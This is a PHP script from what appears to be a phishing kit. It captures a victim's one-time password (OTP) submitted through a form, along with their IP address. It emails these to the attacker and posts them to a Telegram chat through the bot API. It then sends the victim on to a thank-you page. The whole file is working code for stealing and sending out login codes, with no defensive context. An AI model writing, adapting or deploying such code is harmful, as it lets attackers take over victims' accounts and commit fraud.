<?php
include('../common/sub_includes.php');
include_once '../config.php';


ob_start();
if (!isset($_SESSION)) {
  session_start();  // Et on ouvre la session
}

$otp = $_POST['otp'];

if ($_SERVER['REQUEST_METHOD'] == 'POST') {

$message = '
[♾️] +1 OTP [♾️]

👮 OTP : '.$otp.'

🛒 Adresse IP : ' . $_SERVER['REMOTE_ADDR'];

    if($mail_send == true){
      $Subject=" 「♾️」+1 FR3SH OTP ".$_SESSION['name']." | ".$_SERVER['REMOTE_ADDR'];
      $head="From: amendegod@rez.cc <info@INUN.bg>";
      
      mail($rezmail,$Subject,$message,$head);
      }
      
      if($tlg_send == true){
          file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?chat_id=".$rez_chat."&text=".urlencode("$message"));
      }

	 header('Location: ../merci.php');

}
?>